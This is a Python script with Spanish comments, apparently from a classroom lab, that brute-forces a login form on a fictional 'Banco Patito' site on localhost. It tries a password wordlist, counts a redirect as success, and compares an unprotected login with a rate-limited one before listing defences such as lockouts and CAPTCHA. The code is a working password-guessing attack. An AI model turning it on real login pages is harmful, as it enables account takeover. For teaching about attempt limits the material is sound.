# ⚠️ ADVERTENCIA: SCRIPT SOLO PARA ENTORNO ACADÉMICO CONTROLADO
# Ataque de fuerza bruta contra BANCO PATITO
# NO usar contra sistemas reales - es ilegal.

import requests
import time
import sys
import os

BASE_URL = "http://localhost/control"

TARGETS = {
    "1": {
        "nombre": "Login VULNERABLE (Fase 1)",
        "url": f"{BASE_URL}/login_vulnerable.php",
        "blocked_msg": "cuenta está bloqueada",
    },
    "2": {
        "nombre": "Login SEGURO (Fase 2)",
        "url": f"{BASE_URL}/login_seguro.php",
        "blocked_msg": "Demasiados intentos fallidos",
    },
}

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_WORDLIST = os.path.join(SCRIPT_DIR, "passwords.txt")


def banner():
    print("=" * 60)
    print("  BRUTE FORCE - BANCO PATITO (Entorno Académico)")
    print("  ⚠️  SOLO PARA USO EDUCATIVO - NO USAR EN PRODUCCIÓN")
    print("=" * 60)
    print()


def brute_force(usuario, wordlist_path, target):
    if not os.path.exists(wordlist_path):
        print(f"[!] No se encontró el archivo: {wordlist_path}")
        sys.exit(1)

    with open(wordlist_path, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    url = target["url"]
    blocked_msg = target["blocked_msg"]
    total = len(passwords)

    print(f"[*] Objetivo:     {target['nombre']}")
    print(f"[*] URL:          {url}")
    print(f"[*] Usuario:      {usuario}")
    print(f"[*] Diccionario:  {wordlist_path}")
    print(f"[*] Contraseñas:  {total}")
    print("-" * 60)
    print()

    session = requests.Session()
    inicio = time.time()

    for i, password in enumerate(passwords, 1):
        data = {
            "usuario": usuario,
            "password": password
        }

        try:
            response = session.post(url, data=data, allow_redirects=False)
        except requests.ConnectionError:
            print(f"\n[!] Error de conexión. ¿Está Apache corriendo en XAMPP?")
            sys.exit(1)

        progreso = f"[{i}/{total}]"

        if response.status_code == 302:
            elapsed = time.time() - inicio
            print(f"{progreso} ✅ CONTRASEÑA ENCONTRADA: {password}")
            print()
            print("=" * 60)
            print(f"  🔓 Usuario:     {usuario}")
            print(f"  🔑 Contraseña:  {password}")
            print(f"  ⏱️  Tiempo:      {elapsed:.2f} segundos")
            print(f"  📊 Intentos:    {i} de {total}")
            print("=" * 60)
            return True

        if blocked_msg in response.text:
            elapsed = time.time() - inicio
            print(f"{progreso} 🚫 BLOQUEADO al intentar: {password}")
            print()
            print("=" * 60)
            print(f"  🛡️  ATAQUE DETENIDO POR EL SERVIDOR")
            print(f"  El login seguro bloqueó el acceso después de 5 intentos")
            print(f"  ⏱️  Tiempo:      {elapsed:.2f} segundos")
            print(f"  📊 Intentos:    {i} de {total}")
            print("=" * 60)
            print()
            print("[*] Esto demuestra que el límite de intentos FUNCIONA.")
            print("    El atacante no puede seguir probando contraseñas.")
            return False

        print(f"{progreso} ❌ Fallido: {password}")

    elapsed = time.time() - inicio
    print()
    print("=" * 60)
    print(f"  ❌ Contraseña NO encontrada en el diccionario")
    print(f"  ⏱️  Tiempo total: {elapsed:.2f} segundos")
    print(f"  📊 Intentos:     {total}")
    print("=" * 60)
    return False


def main():
    banner()

    print("[?] Selecciona el objetivo:")
    print("    1) Login VULNERABLE (Fase 1) - Sin protección")
    print("    2) Login SEGURO (Fase 2)     - Con límite de intentos")
    print()
    opcion = input("[?] Opción (1 o 2): ").strip()
    if opcion not in TARGETS:
        print("[!] Opción inválida.")
        sys.exit(1)

    target = TARGETS[opcion]
    print(f"\n[*] Seleccionado: {target['nombre']}")

    if len(sys.argv) >= 2:
        usuario = sys.argv[1]
    else:
        usuario = input("\n[?] Usuario a atacar (default: admin): ").strip()
        if not usuario:
            usuario = "admin"

    if len(sys.argv) >= 3:
        wordlist = sys.argv[2]
    else:
        wordlist = DEFAULT_WORDLIST

    print()
    confirm = input(f"[?] Iniciar ataque contra '{usuario}'? (s/n): ").strip().lower()
    if confirm != "s":
        print("[*] Ataque cancelado.")
        sys.exit(0)

    print()
    found = brute_force(usuario, wordlist, target)

    if found:
        print("\n[*] El ataque fue exitoso. Esto demuestra por qué se necesitan:")
        print("    - Límite de intentos fallidos")
        print("    - CAPTCHA después de N intentos")
        print("    - Bloqueo temporal de cuenta")
        print("    - Contraseñas fuertes")


if __name__ == "__main__":
    main()
